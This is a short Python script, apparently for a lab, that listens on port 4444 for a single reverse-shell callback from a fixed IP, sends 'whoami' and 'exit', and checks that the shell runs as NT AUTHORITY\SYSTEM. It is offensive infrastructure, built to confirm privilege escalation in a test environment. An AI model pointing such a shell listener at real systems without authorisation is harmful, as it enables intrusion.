#!/usr/bin/env python3
"""Accept one lab callback, run whoami, verify SYSTEM, then close the shell."""

from __future__ import annotations

import socket
import sys
from datetime import datetime, timezone


BIND_IP = "10.10.10.20"
BIND_PORT = 4444
EXPECTED_SOURCE_IP = "10.10.10.30"
COMMANDS = b"whoami\r\nexit\r\n"


def main() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((BIND_IP, BIND_PORT))
        listener.listen(1)
        listener.settimeout(180)
        print(f"listening on {BIND_IP}:{BIND_PORT} for {EXPECTED_SOURCE_IP}")

        connection, address = listener.accept()
        with connection:
            timestamp = datetime.now(timezone.utc).astimezone().isoformat()
            print(f"connected_at={timestamp}")
            print(f"source={address[0]}:{address[1]}")
            if address[0] != EXPECTED_SOURCE_IP:
                print("unexpected source; closing without sending commands", file=sys.stderr)
                return 2

            connection.settimeout(15)
            connection.sendall(COMMANDS)
            chunks = []
            while True:
                try:
                    chunk = connection.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                chunks.append(chunk)

    output = b"".join(chunks).decode("cp949", errors="replace")
    print("----- callback output -----")
    print(output.rstrip())
    print("---------------------------")

    normalized = output.replace("/", "\\").lower()
    if "nt authority\\system" not in normalized:
        print("SYSTEM identity was not observed", file=sys.stderr)
        return 1

    print("verified=NT AUTHORITY\\SYSTEM")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
